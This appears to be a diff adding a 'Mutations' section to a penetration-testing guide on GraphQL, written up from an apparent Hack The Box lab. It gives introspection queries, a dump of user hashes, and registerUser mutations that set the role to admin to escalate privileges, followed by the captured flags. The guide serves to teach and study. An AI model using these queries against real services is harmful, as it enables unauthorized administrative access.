@@ -13,7 +13,7 @@ This document outlines common techniques for identifying and exploiting vulnerab
       - [Information Disclosure](#information-disclosure)
       - [Insecure Direct Object Reference (IDOR)](#insecure-direct-object-reference-idor)
       - [SQL Injection](#sql-injection)
-      - [Cross Site Scripting (XSS)](#cross-site-scripting-xss)
+      - [Mutations](#mutations)
 
 
 ---
@@ -638,4 +638,263 @@ This demonstrates that **GraphQL does not inherently protect against injection a
 
 ---
 
-### Cross Site Scripting (XSS)
+### Mutations
+
+All GraphQL queries covered so far are used to **read data**. **Mutations** are a special class of GraphQL operations used to **modify data**, including creating, updating, and deleting objects.
+
+Improperly secured mutations frequently lead to **authorization bypasses, privilege escalation, and mass assignment vulnerabilities**.
+
+To identify available mutations and their required arguments, we use the following introspection query:
+
+```graphql
+query {
+  __schema {
+    mutationType {
+      name
+      fields {
+        name
+        args {
+          name
+          defaultValue
+          type {
+            ...TypeRef
+          }
+        }
+      }
+    }
+  }
+}
+
+fragment TypeRef on __Type {
+  kind
+  name
+  ofType {
+    kind
+    name
+    ofType {
+      kind
+      name
+      ofType {
+        kind
+        name
+        ofType {
+          kind
+          name
+          ofType {
+            kind
+            name
+            ofType {
+              kind
+              name
+              ofType {
+                kind
+                name
+              }
+            }
+          }
+        }
+      }
+    }
+  }
+}
+```
+
+The response reveals a mutation named `registerUser`, which appears to allow the creation of new user accounts. This mutation requires a `RegisterUserInput` object as input:
+
+```graphql
+{
+  "data": {
+    "__schema": {
+      "mutationType": {
+        "name": "Mutation",
+        "fields": [
+          {
+            "name": "registerUser",
+            "args": [
+              {
+                "name": "input",
+                "defaultValue": null,
+                "type": {
+                  "kind": "NON_NULL",
+                  "name": null,
+                  "ofType": {
+                    "kind": "INPUT_OBJECT",
+                    "name": "RegisterUserInput",
+                    "ofType": null
+                  }
+                }
+              }
+            ]
+          }
+        ]
+      }
+    }
+  }
+}
+```
+
+![Filtered output](images/mutation.PNG)
+
+To understand which fields can be supplied when registering a user, we enumerate the `RegisterUserInput` object:
+
+```graphql
+{   
+  __type(name: "RegisterUserInput") {
+    name
+    inputFields {
+      name
+      description
+      defaultValue
+    }
+  }
+}
+```
+
+The response shows that the `RegisterUserInput` object contains the following fields:
+
+- `username`
+- `password`
+- `role`
+- `msg`
+
+![Filtered output](images/mutation2.PNG)
+
+This indicates that the client can directly control the user’s **role**, which may lead to privilege escalation.
+
+Before creating a new user, we query existing users to understand how credentials are stored:
+
+```graphql
+{
+  users {
+    username
+    password
+    role
+    msg
+  }
+}
+```
+
+The response shows that user passwords are stored as **MD5 hashes**:
+
+```graphql
+{
+  "data": {
+    "users": [
+      {
+        "username": "htb-stdnt",
+        "password": "c874441baa22306df202ca127f23d3a7",
+        "role": "user",
+        "msg": "Welcome!"
+      },
+      {
+        "username": "test",
+        "password": "b4574701cdf945940353b356925dddb7",
+        "role": "user",
+        "msg": "Test"
+      },
+      {
+        "username": "admin",
+        "password": "HTB{79ebbbce53f40edf75c667ef6fd36fae}",
+        "role": "admin",
+        "msg": "Hello admin!"
+      }
+    ]
+  }
+}
+```
+
+![Filtered output](images/mutation3.PNG)
+
+We generate an MD5 hash for the password `password`:
+
+```bash
+echo -n "password" | md5sum
+```
+
+Output:
+
+```
+5f4dcc3b5aa765d61d8327deb882cf99
+```
+
+Using the `registerUser` mutation, we create a new user with standard privileges:
+
+```graphql
+mutation {
+  registerUser(input: {username: "sam", password: "5f4dcc3b5aa765d61d8327deb882cf99", role: "user", msg: "newUser"}) {
+    user {
+      username
+      password
+      msg
+      role
+    }
+  }
+}
+```
+
+The response confirms successful user creation:
+
+```graphql
+{
+  "data": {
+    "registerUser": {
+      "user": {
+        "username": "sam",
+        "password": "5f4dcc3b5aa765d61d8327deb882cf99",
+        "msg": "newUser",
+        "role": "user"
+      }
+    }
+  }
+}
+```
+
+![Filtered output](images/mutation4.PNG)
+
+Authentication using the newly created account is successful.
+
+Because the `role` field is client-controlled, we attempt to create a new user with administrative privileges:
+
+```graphql
+mutation {
+  registerUser(input: {username: "muppet", password: "5f4dcc3b5aa765d61d8327deb882cf99", role: "admin", msg: "newUser"}) {
+    user {
+      username
+      password
+      msg
+      role
+    }
+  }
+}
+```
+
+The response confirms that the user is created with the `admin` role:
+
+```
+{
+  "data": {
+    "registerUser": {
+      "user": {
+        "username": "muppet",
+        "password": "5f4dcc3b5aa765d61d8327deb882cf99",
+        "msg": "newUser",
+        "role": "admin"
+      }
+    }
+  }
+}
+```
+
+![Filtered output](images/mutation5.PNG)
+
+After authenticating as the newly created administrative user, we gain access to the `Admin Area` and successfully retrieve the flag:
+
+```
+HTB{f7082828b5e5ad40d955846ba415d17f}
+```
+
+![Filtered output](images/mutation6.PNG)
+
+This demonstrates a **mass assignment and privilege escalation vulnerability** caused by insufficient authorization checks on GraphQL mutations. Allowing clients to supply sensitive fields such as `role` enables attackers to escalate privileges and fully compromise the application.
+
+---
